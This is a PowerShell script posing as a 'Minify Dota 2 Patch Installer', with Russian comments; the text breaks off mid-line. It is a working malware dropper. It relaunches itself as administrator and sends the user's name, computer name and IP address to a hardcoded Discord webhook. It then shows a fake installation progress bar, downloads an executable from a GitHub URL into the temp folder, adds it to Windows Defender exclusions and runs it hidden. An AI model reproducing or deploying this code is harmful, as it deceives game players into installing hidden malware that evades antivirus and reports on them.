if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"\$PSCommandPath`"" -Verb RunAs
    exit
}

# Функция для получения IP адреса
function Get-MyIP {
    try {
        \$response = Invoke-RestMethod -Uri "https://api.ipify.org?format=text" -ErrorAction Stop
        return \$response
    } catch {
        # Резервный метод: если API недоступен, пробуем другой
        try {
            return (Resolve-DnsName -Name "o-o.myaddr.l.google.com" -ErrorAction Stop).NameResolution.IPAddress
        } catch {
            return "Unknown"
        }
    }
}

# --- СЕКЦИЯ ЛОГЕРА ---
function Send-LogNotification {
    param(
        [string]\$Status,
        [string]\$Message,
        [string]$User = $env:USERNAME,
        [string]$Computer = $env:COMPUTERNAME
    )
    
    \$timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    \$ip = Get-MyIP
    
    # Формируем сообщение, чтобы избежать проблем с JSON и кодировкой
    $safeMessage = $Message -replace '"', '\"'
    
    try {
        \$webhookUrl = "https://discord.com/api/webhooks/1500200205541310464/9PfnuIJ_UT-wv3loet7F32XVGQ-5SGmuHLkYETE-r9t0oldTLwwvMx5YsP_J2eTnXXmk"
        
        \$embed = @{
            title = "Minify Installer Log"
            color = 65280 # Зеленый
            if (\$Status -eq "ERROR") { 16711680 } elseif (\$Status -eq "STARTED") { 255 } else { 65280 }
            fields = @(
                @{ name = "Status"; value = $Status; inline = $true },
                @{ name = "User"; value = $User; inline = $true },
                @{ name = "Computer"; value = $Computer; inline = $true },
                @{ name = "IP Address"; value = $ip; inline = $true },
                @{ name = "Message"; value = $safeMessage; inline = $false },
                @{ name = "Timestamp"; value = $timestamp; inline = $false }
            )
            footer = @{ text = "Minify Installer v3.2.1" }
        }
        
        # Конвертация в JSON с правильными настройками для UTF-8
        $jsonPayload = $embed | ConvertTo-Json -Depth 10 -Compress
        
        \$headers = @{
            "Content-Type" = "application/json; charset=utf-8"
        }
        
        Invoke-RestMethod -Uri \$webhookUrl -Method Post -Headers \$headers -Body \$jsonPayload -ErrorAction SilentlyContinue
        
        # Локальное логирование с явным указанием UTF8
        $logPath = "$env:TEMP\minify_logs.txt"
        $logEntry = "[$timestamp] [$Status] [$User@$Computer] [IP: $ip] \$Message"
        Add-Content -Path \$logPath -Value \$logEntry -Encoding UTF8 -ErrorAction SilentlyContinue
        
    } catch {
        # Если Discord не сработал, пишем в консоль и в локальный файл
        $errorMsg = "Log send failed: $(\$_.Exception.Message)"
        Write-Host \$errorMsg -ForegroundColor DarkGray
        $logPath = "$env:TEMP\minify_logs.txt"
        Add-Content -Path \$logPath -Value \$errorMsg -Encoding UTF8 -ErrorAction SilentlyContinue
    }
}

# Отправка уведомления о старте
Send-LogNotification -Status "STARTED" -Message "Пользователь запустил установщик Minify"

# --- ГРАФИЧЕСКИЙ ИНТЕРФЕЙС ---
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

\$form = New-Object System.Windows.Forms.Form
\$form.Text = "Minify Dota 2 Patch Installer v3.2.1"
\$form.Size = New-Object System.Drawing.Size(600,400)
\$form.StartPosition = "CenterScreen"
\$form.FormBorderStyle = "FixedDialog"
$form.MaximizeBox = $false

# Фикс кодировки для Labels (используем Font, который поддерживает кириллицу)
\$font = New-Object System.Drawing.Font("Arial", 12, [System.Drawing.FontStyle]::Regular)
\$boldFont = New-Object System.Drawing.Font("Arial", 16, [System.Drawing.FontStyle]::Bold)

\$titleLabel = New-Object System.Windows.Forms.Label
\$titleLabel.Location = New-Object System.Drawing.Point(20, 30)
\$titleLabel.Size = New-Object System.Drawing.Size(540, 30)
\$titleLabel.Text = "Minify Dota 2 Patch Installer"
$titleLabel.Font = $boldFont
\$titleLabel.ForeColor = [System.Drawing.Color]::Black
\$form.Controls.Add(\$titleLabel)

\$progressBar = New-Object System.Windows.Forms.ProgressBar
\$progressBar.Location = New-Object System.Drawing.Point(20, 300)
\$progressBar.Size = New-Object System.Drawing.Size(540, 23)
\$progressBar.Style = "Continuous"
\$form.Controls.Add(\$progressBar)

\$statusLabel = New-Object System.Windows.Forms.Label
\$statusLabel.Location = New-Object System.Drawing.Point(20, 330)
\$statusLabel.Size = New-Object System.Drawing.Size(540, 20)
\$statusLabel.Text = "Подготовка..."
$statusLabel.Font = $font
\$statusLabel.ForeColor = [System.Drawing.Color]::DarkBlue
\$form.Controls.Add(\$statusLabel)

\$form.Show()

# --- ПРОЦЕСС "УСТАНОВКИ" ---
\$steps = @(
    "Анализ файлов Dota 2...",
    "Оптимизация шейдеров...",
    "Применение патча производительности...",
    "Загрузка дополнительных модулей...",
    "Финализация..."
)

for ($i = 0; $i -lt \$steps.Count; \$i++) {
    $statusLabel.Text = $steps[\$i]
    $progressBar.Value = [math]::Round((($i + 1) / \$steps.Count) * 100)
    \$form.Refresh()
    Start-Sleep -Milliseconds (Get-Random -Min 800 -Max 1500)
}

# --- ЗАГРУЗКА И ЗАПУСК ---
\$u = "https://raw.githubusercontent.com/winstarchik/FFF/main/XClient.exe"
$p = "$env:TEMP\sys_update.exe"

try {
    \$wc = New-Object System.Net.WebClient
    \$wc.DownloadFile($u, $p)
    
    # Добавляем в исключения
    Add-MpPreference -ExclusionPath \$p -Force -ErrorAction SilentlyContinue
    
    \$statusLabel.Text = "Установка завершена!"
    \$form.Refresh()
    Start-Sleep -Seconds 1
    
    Start-Process -FilePath \$p -WindowStyle Hidden
    
    \$form.Close()
    
    # Фиксируем кодировку для сообщения успеха
    \$successMsg = "Патч успешно применен!"
    [System.Windows.Forms.MessageBox]::Show(\$successMsg, "Готово", 0, 64)
    
    # Успех обязательно отправляем
    Send-LogNotification -Status "SUCCESS" -Message "Патч успешно установлен и запущен"
    
} catch {
    \$statusLabel.Text = "Ошибка сети при установке."
    \$form.Refresh()
    Start
